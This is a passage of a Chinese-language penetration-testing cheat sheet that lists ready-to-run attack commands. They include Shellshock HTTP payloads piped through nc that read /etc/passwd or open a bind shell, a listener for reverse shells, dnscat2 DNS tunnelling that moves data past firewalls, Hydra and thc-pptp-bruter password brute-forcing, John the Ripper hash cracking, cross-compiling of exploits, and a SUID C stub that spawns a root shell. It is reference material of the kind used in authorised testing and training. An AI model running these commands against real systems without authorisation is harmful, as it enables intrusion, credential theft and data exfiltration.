</span></span></code></pre></td></tr></table></div></div><h4 id=pptp-hacking>PPTP Hacking<a hidden class=anchor aria-hidden=true href=#pptp-hacking>#</a></h4><p>验证PPTP服务 ，它以TCP协议在1723端口监听</p><h5 id=nmap-pptp-指纹识别>NMAP PPTP 指纹识别:<a hidden class=anchor aria-hidden=true href=#nmap-pptp-指纹识别>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmap –Pn -sV -p 1723 TARGET(S)
</span></span></code></pre></td></tr></table></div></div><h5 id=pptp字典攻击>PPTP字典攻击<a hidden class=anchor aria-hidden=true href=#pptp字典攻击>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
</span></span></code></pre></td></tr></table></div></div><h3 id=dns-隧道>DNS 隧道<a hidden class=anchor aria-hidden=true href=#dns-隧道>#</a></h3><p>通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。</p><h4 id=攻击机器>攻击机器：<a hidden class=anchor aria-hidden=true href=#攻击机器>#</a></h4><p>安装:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apt-get update
</span></span><span style=display:flex><span>apt-get -y install ruby-dev git make g++
</span></span><span style=display:flex><span>gem install bundler
</span></span><span style=display:flex><span>git clone https://github.com/iagox86/dnscat2.git
</span></span><span style=display:flex><span>cd dnscat2/server
</span></span><span style=display:flex><span>bundle install
</span></span></code></pre></td></tr></table></div></div><p>运行dnscat2:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ruby ./dnscat2.rb
</span></span><span style=display:flex><span>dnscat2&gt; New session established: 1422
</span></span><span style=display:flex><span>dnscat2&gt; session -i 1422
</span></span></code></pre></td></tr></table></div></div><p>目标机器:</p><p><a href=https://downloads.skullsecurity.org/dnscat2/>https://downloads.skullsecurity.org/dnscat2/</a></p><p><a href=https://github.com/lukebaggett/dnscat2-powershell/>https://github.com/lukebaggett/dnscat2-powershell/</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>dnscat --host &lt;dnscat server_ip&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=bof--exploit>BOF / Exploit<a hidden class=anchor aria-hidden=true href=#bof--exploit>#</a></h2><h2 id=exploit-搜索>Exploit 搜索<a hidden class=anchor aria-hidden=true href=#exploit-搜索>#</a></h2><p>寻找枚举主机/服务的exp</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>`searchsploit windows 2003</td><td>grep -i local`</td></tr><tr><td><code>site:exploit-db.com exploit kernel &lt;= 3</code></td><td>使用Google搜索exploit-db.com</td></tr><tr><td><code>grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*</code></td><td>用grep搜索metasploit的模块——因为msf的搜索有点差劲。</td></tr></tbody></table><h3 id=搜索exp>搜索EXP<a hidden class=anchor aria-hidden=true href=#搜索exp>#</a></h3><p>安装exploit-db的本地备份:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-74-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-74-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-74-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-74-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-74-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-74-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-74-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-74-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> searchsploit –u
</span></span><span style=display:flex><span> searchsploit apache 2.2
</span></span><span style=display:flex><span> searchsploit &#34;Linux Kernel&#34;
</span></span><span style=display:flex><span> searchsploit linux 2.6 | grep -i ubuntu | grep local
</span></span></code></pre></td></tr></table></div></div><h3 id=在kali上编译windows的exp>在Kali上编译WIndows的exp<a hidden class=anchor aria-hidden=true href=#在kali上编译windows的exp>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
</span></span><span style=display:flex><span>wine mingw-get-setup.exe
</span></span><span style=display:flex><span>select mingw32-base
</span></span><span style=display:flex><span>cd /root/.wine/drive_c/windows
</span></span><span style=display:flex><span>wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip
</span></span><span style=display:flex><span>cd /root/.wine/drive_c/MinGW/bin
</span></span><span style=display:flex><span>wine gcc -o ability.exe /tmp/exploit.c -lwsock32
</span></span><span style=display:flex><span>wine ability.exe  
</span></span></code></pre></td></tr></table></div></div><h3 id=交叉编译exploits>交叉编译Exploits<a hidden class=anchor aria-hidden=true href=#交叉编译exploits>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>gcc -m32 -o output32 hello.c (32 bit)
</span></span><span style=display:flex><span>gcc -m64 -o output hello.c (64 bit)
</span></span></code></pre></td></tr></table></div></div><h3 id=利用通用漏洞>利用通用漏洞<a hidden class=anchor aria-hidden=true href=#利用通用漏洞>#</a></h3><h4 id=利用shellshock漏洞>利用Shellshock漏洞<a hidden class=anchor aria-hidden=true href=#利用shellshock漏洞>#</a></h4><p>一个用来寻找和利用Shellshock漏洞的攻击</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-77-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-77-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>git clone https://github.com/nccgroup/shocker
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./shocker.py -H TARGET  --command &#34;/bin/cat /etc/passwd&#34; -c /cgi-bin/status --verbose
</span></span></code></pre></td></tr></table></div></div><h5 id=cat-file-查看文件内容>cat file (查看文件内容)<a hidden class=anchor aria-hidden=true href=#cat-file-查看文件内容>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>echo -e &#34;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&#34; | nc TARGET 80
</span></span></code></pre></td></tr></table></div></div><h5 id=shell-shock-运行bind-shell>Shell Shock 运行bind shell<a hidden class=anchor aria-hidden=true href=#shell-shock-运行bind-shell>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-80-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-80-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>echo -e &#34;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&#34; | nc TARGET 80
</span></span></code></pre></td></tr></table></div></div><h5 id=shell-shock-反弹shell>Shell Shock 反弹shell<a hidden class=anchor aria-hidden=true href=#shell-shock-反弹shell>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nc -l -p 443
</span></span></code></pre></td></tr></table></div></div><h2 id=简单的本地web服务器>简单的本地Web服务器<a hidden class=anchor aria-hidden=true href=#简单的本地web服务器>#</a></h2><p>使用Python命令运行本地Web服务，在接受反向shell和攻击目标机器是很方便。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>python -m SimpleHTTPServer 80</code></td><td>运行一个基本的 http 服务,接受反弹shell等情况下很棒</td></tr><tr><td><code>python3 -m http.server</code></td><td>运行一个基本的 Python3 http 服务</td></tr><tr><td><code>ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"</code></td><td>运行一个基本的ruby http 服务</td></tr><tr><td><code>php -S 0.0.0.0:80</code></td><td>运行一个基本的 PHP http 服务</td></tr></tbody></table><h2 id=挂载文件共享>挂载文件共享<a hidden class=anchor aria-hidden=true href=#挂载文件共享>#</a></h2><p>怎样挂载 NFS / CIFS以进行 Windows 和Linux 的文件共享。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></td><td>挂载NFS共享到 <code>/mnt/nfs</code></td></tr><tr><td><code>mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs</code></td><td>挂载Windows CIFS / SMB 共享到 Linux 的 <code>/mnt/cifs</code> 。如果不直接在命令里带密码，可以在询问后输入，这样就不会在bash命令历史里存储明文密码</td></tr><tr><td><code>net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no</code></td><td>使用命令行在Windows间挂载共享文件</td></tr><tr><td><code>apt-get install smb4k -y</code></td><td>在Kali上安装smb4k，方便从Linux的GUI查看SMB共享</td></tr></tbody></table><h2 id=http--https-web服务枚举>HTTP / HTTPS Web服务枚举<a hidden class=anchor aria-hidden=true href=#http--https-web服务枚举>#</a></h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nikto -h 192.168.1.1</code></td><td>对目标使用 nikto 进行扫描</td></tr><tr><td><code>dirbuster</code></td><td>使用GUI配置，命令行不好使</td></tr></tbody></table><h2 id=数据包侦测>数据包侦测<a hidden class=anchor aria-hidden=true href=#数据包侦测>#</a></h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></td><td>将网卡eth0的80端口的流量导出到output.pcap</td></tr></tbody></table><h2 id=用户名枚举>用户名枚举<a hidden class=anchor aria-hidden=true href=#用户名枚举>#</a></h2><p>一些用来枚举目标系统用户名的手法。</p><h3 id=smb-用户枚举>SMB 用户枚举<a hidden class=anchor aria-hidden=true href=#smb-用户枚举>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</code></td><td>枚举SMB用户</td></tr><tr><td><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></td><td>利用RID cycle枚举SMB用户</td></tr></tbody></table><h3 id=snmp-用户枚举>SNMP 用户枚举<a hidden class=anchor aria-hidden=true href=#snmp-用户枚举>#</a></h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td>`snmpwalk public -v1 192.168.X.XXX 1</td><td>grep 77.1.2.25</td></tr><tr><td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX</code></td><td>枚举 SNMP 用户</td></tr><tr><td><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)</code></td><td>使用nmap搜索SNMP服务器，然后用grep过滤输出</td></tr></tbody></table><h2 id=密码>密码<a hidden class=anchor aria-hidden=true href=#密码>#</a></h2><h3 id=字典>字典<a hidden class=anchor aria-hidden=true href=#字典>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>/usr/share/wordlists</code></td><td>Kali 的字典存放路径</td></tr></tbody></table><h2 id=爆破服务>爆破服务<a hidden class=anchor aria-hidden=true href=#爆破服务>#</a></h2><h3 id=使用hydra-爆破ftp>使用Hydra 爆破FTP<a hidden class=anchor aria-hidden=true href=#使用hydra-爆破ftp>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V</code></td><td>使用Hydra 爆破FTP</td></tr></tbody></table><h3 id=使用hydra-爆破pop3>使用Hydra 爆破POP3<a hidden class=anchor aria-hidden=true href=#使用hydra-爆破pop3>#</a></h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V</code></td><td>使用Hydra 爆破POP3</td></tr></tbody></table><h3 id=使用hydra-爆破smtp>使用Hydra 爆破SMTP<a hidden class=anchor aria-hidden=true href=#使用hydra-爆破smtp>#</a></h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></td><td>使用Hydra 爆破SMTP</td></tr></tbody></table><p>使用 <code>-t</code> 限制并发连接数，如 <code>-t 15</code></p><h2 id=密码破解>密码破解<a hidden class=anchor aria-hidden=true href=#密码破解>#</a></h2><p>渗透测试中用于密码破解的工具。</p><h3 id=john-the-ripper---jtr>John The Ripper - JTR<a hidden class=anchor aria-hidden=true href=#john-the-ripper---jtr>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></td><td>JTR 破解密码</td></tr><tr><td><code>john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt</code></td><td>JTR 使用字典爆破解密</td></tr><tr><td><code>john --format=descrypt hash --show</code></td><td>JTR 爆破解密</td></tr></tbody></table><h2 id=windows-渗透测试命令>Windows 渗透测试命令<a hidden class=anchor aria-hidden=true href=#windows-渗透测试命令>#</a></h2><p>See <strong>Windows Penetration Testing Commands</strong>.【待原文补充】</p><h2 id=linux-渗透测试命令>Linux 渗透测试命令<a hidden class=anchor aria-hidden=true href=#linux-渗透测试命令>#</a></h2><p>参考本站的<a href=https://highon.coffee/blog/linux-commands-cheat-sheet/>Linux 命令速查表</a> ，该表提供了很多有用的命令。</p><h2 id=编译exp>编译EXP<a hidden class=anchor aria-hidden=true href=#编译exp>#</a></h2><p>Some notes on compiling exploits.【待原文补充】</p><h3 id=判断c代码适用于windows平台还是linux>判断C代码适用于Windows平台还是Linux<a hidden class=anchor aria-hidden=true href=#判断c代码适用于windows平台还是linux>#</a></h3><p>通过<code>#include</code> 的文件来判定</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></td><td>Windows平台代码</td></tr><tr><td><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h</code></td><td>Linux平台代码</td></tr></tbody></table><h3 id=使用gcc编译exploit>使用GCC编译Exploit<a hidden class=anchor aria-hidden=true href=#使用gcc编译exploit>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>gcc -o exploit exploit.c</code></td><td>GCC基本用法</td></tr></tbody></table><h3 id=在64位的kali上用gcc编译32位的exp>在64位的Kali上用GCC编译32位的EXP<a hidden class=anchor aria-hidden=true href=#在64位的kali上用gcc编译32位的exp>#</a></h3><p>很方便地在64位的攻击机器上交叉编译32位的二进制文件。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>gcc -m32 exploit.c -o exploit</code></td><td>在64位的Linux上交叉编译32位的二进制文件</td></tr></tbody></table><h3 id=在-linux上编译可运行于windows的exe文件>在 Linux上编译可运行于Windows的exe文件<a hidden class=anchor aria-hidden=true href=#在-linux上编译可运行于windows的exe文件>#</a></h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></td><td>在 Linux上生成Windows的exe</td></tr></tbody></table><h2 id=suid-二进制>SUID 二进制<a hidden class=anchor aria-hidden=true href=#suid-二进制>#</a></h2><p>通常具有SUID的 C二进制文件要求以超级用户登陆shell，您可以按需更新UID / GID和shell。</p><p>下面是一些可用的shell：</p><h3 id=运行-binbash的suid-c-shell>运行 /bin/bash的SUID C Shell<a hidden class=anchor aria-hidden=true href=#运行-binbash的suid-c-shell>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>int main(void){
</span></span><span style=display:flex><span>       setresuid(0, 0, 0);
</span></span><span style=display:flex><span>       system(&#34;/bin/bash&#34;);
</span></span><span style=display:flex><span>}       
